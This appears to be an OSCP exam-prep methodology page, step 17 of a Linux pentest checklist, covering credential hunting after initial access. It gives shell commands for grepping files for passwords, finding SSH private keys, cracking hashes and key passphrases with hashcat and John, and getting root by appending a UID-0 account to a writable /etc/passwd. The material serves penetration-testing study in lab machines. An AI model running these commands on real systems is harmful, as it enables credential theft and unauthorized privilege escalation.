# Linux - Credential Search

**Step 17 of 50 · Linux**

*Search application and user files for passwords, hashes, and reusable connection details.*

## Run this

> **Why:** This filter extracts readable evidence from the saved output so likely credentials or configuration clues can be validated.
```bash
grep -rniE 'password|passwd|pwd|secret' /var/www /opt /home 2>/dev/null
find /var/www /opt /home -name '.env' -o -name 'wp-config.php' 2>/dev/null
```

## Example output

```

/var/www/app/.env:DB_PASSWORD=REDACTED
/opt/app/config.php:password = REDACTED
...
```
Also check:

> **Why:** This SSH connection tests the recovered credential or reaches a legacy daemon using the compatibility options it requires.
```bash
# Writable /etc/passwd — can add a root-equivalent account
ls -la /etc/passwd
openssl passwd -1 password123   # generate a password hash

# SSH keys in user home directories
find /home /root -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null
```

## What did you get?

- [ ] A cleartext credential is found → **Run `ssh $Username@$BoxIP` or submit the credential to the identified application once, then record whether it succeeds**
- [ ] A hash is found → **Run `hashcat -m 0 $BoxDir/loot/hash.txt /usr/share/wordlists/rockyou.txt`, then go to Step 18 · [[Linux - Database Access]] with the recovered value**
- [ ] A database configuration is found → **Go to Step 18 · [[Linux - Database Access]]**
- [ ] `/etc/passwd` is world-writable → **Run `openssl passwd -1`, append the generated hash in a UID-0 entry to `/etc/passwd`, then run `su $Username2`**
- [ ] An SSH private key is found → **Set `$KeyFile` to the discovered key path, then run `cp $KeyFile $BoxDir/loot/id_rsa && chmod 600 $BoxDir/loot/id_rsa && ssh -i $BoxDir/loot/id_rsa $Username@$BoxIP`**
- [ ] Nothing useful is found → **Go to Step 19 · [[Linux - Kernel Exploit]]**

## Notes

Inspect config files without printing private values into the transcript.

## Gotcha

> [!warning] 💡
> Search output can contain credentials. Save it to private loot and redact screenshots.

> [!warning] 💡
> A writable `/etc/passwd` is unusual but decisive. Confirm it is world-writable (`-rw-rw-rw-`) before attempting the edit. If you write a malformed entry the file is still valid — only the new entry is broken, not the original accounts.

## Writable `/etc/passwd`

Use this branch when the file is owned by your account or writable by your group. `/etc/passwd` maps usernames to UIDs; a new entry with UID 0 receives root privileges when selected with `su`.

> **Why:** This check shows the owner and permission bits on `/etc/passwd`; look for write permission for your user or one of your groups.
```bash
ls -la /etc/passwd
```

> **Why:** This Kali-side command creates a password hash for the controlled account; the hash is placed into the file entry rather than recorded in notes.
```bash
openssl passwd -1 $Password
```

> **Why:** This target-side append creates a new account whose UID and GID are both 0; success is a valid new line followed by a successful `su` login.
```bash
# Substitute the generated hash and controlled username privately before running.
echo "$Username2:$Hash:0:0:root:/root:/bin/bash" >> /etc/passwd
su $Username2
```

## Additional routing

- [ ] `/etc/passwd` is writable and the new account becomes UID 0 → **Confirm identity, then continue to Linux clean-down**
- [ ] Only group write is present → **Check group membership and retry only if the current user can write**
- [ ] The file is not writable → **Continue with Step 18 · [[Linux - Database Access]] or Step 19 · [[Linux - Kernel Exploit]]**
## Encrypted SSH key workflow

When an application exposes an encrypted private key, convert the key's encryption metadata for John before attempting repeated guesses. `ssh2john` creates a crackable representation; the original key remains the input for the later SSH connection.

> **Why:** These commands prepare the discovered key, crack its passphrase with the standard Kali wordlist, and use the result for SSH validation.
```bash
ssh2john $KeyFile > $HashFile
john $HashFile --wordlist=/usr/share/wordlists/rockyou.txt
ssh -i $KeyFile $Username@$BoxIP
```

> [!warning] 💡
> Keep the key, John hash, and recovered passphrase in private loot. Do not print them into a report or screenshot.

## Seen in
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- ONA configuration credential reuse and encrypted SSH key passphrase cracking

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
